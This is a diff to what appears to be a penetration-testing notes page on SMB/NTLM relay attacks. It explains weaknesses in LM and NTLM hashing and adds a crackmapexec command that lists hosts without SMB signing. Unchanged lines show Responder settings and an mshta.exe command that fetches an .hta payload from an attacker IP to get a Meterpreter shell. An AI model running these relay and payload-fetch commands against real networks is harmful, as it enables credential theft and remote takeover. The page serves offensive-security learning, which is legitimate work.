@@ -1,4 +1,4 @@
-# SMB/NTLM Relay
+# ⭕ SMB/NTLM Relay
 
 ## SMB relay
 
@@ -26,8 +26,6 @@ NTLM authentication is a challenge/response protocol and consists of three messa
 
 ![](<../../../.gitbook/assets/image (262).png>)
 
-
-
 the actual password is never sent on the network, since it is hashed and encrypted. The schemes used to encrypt and send the Type 3 response have changed over the years due to lack of security.
 
 The very first scheme was LM, which turned out to be very simple and easy to crack. As a result, it was replaced by NTLM, which in turn was deprecated by NTLMv2 and finally Kerberos at the end.
@@ -40,9 +38,9 @@ The algorithm used to compute the LM Hash is DES and here are the steps used by 
 
 The computation of the NTLM Hashes is still very simple:
 
-&#x20;• The user’s password is converted to UNICODE&#x20;
+• The user’s password is converted to UNICODE
 
-• MD4 is then used to get a 16-byte long hash By using UNICODE, the allowed charset is much wider.&#x20;
+• MD4 is then used to get a 16-byte long hash By using UNICODE, the allowed charset is much wider.
 
 Although it address some LM flaws, it is still considered weak. Moreover, the NTLM response is sent together with the LM response, most of the time .
 
@@ -74,15 +72,13 @@ No diffusion, meaning that each part of DES output is not linked to the previous
 
 #### The only randomness in the protocol is the server challenge (step 2 of the protocol).
 
-#### &#x20;• Again, we impersonate the server so we control that.
+#### • Again, we impersonate the server so we control that.
 
 #### There are two methods we can use :
 
 #### • Force the client (target) to start a connection to us (fake server)
 
-#### &#x20;• Use Man-in-the-Middle techniques in order to sniff the client response
-
-
+#### • Use Man-in-the-Middle techniques in order to sniff the client response
 
 ## SMB Relay with Metasploit
 
@@ -145,6 +141,14 @@ nano /usr/share/responder/Responder.conf
 ```
 
 ![](<../../../.gitbook/assets/image (219).png>)
+
+we can also use crackmapexec to generate a list of all hosts in a network with SMB signing disabled:
+
+```
+crackmapexec smb 172.16.1.1/24 --gen-relay-list target.txt
+```
+
+
 
 #### turn off smb and http in responder settings
 
@@ -236,6 +240,3 @@ mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
 ### other ways to get a meterpreter shell:
 
 {% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
-
-
-
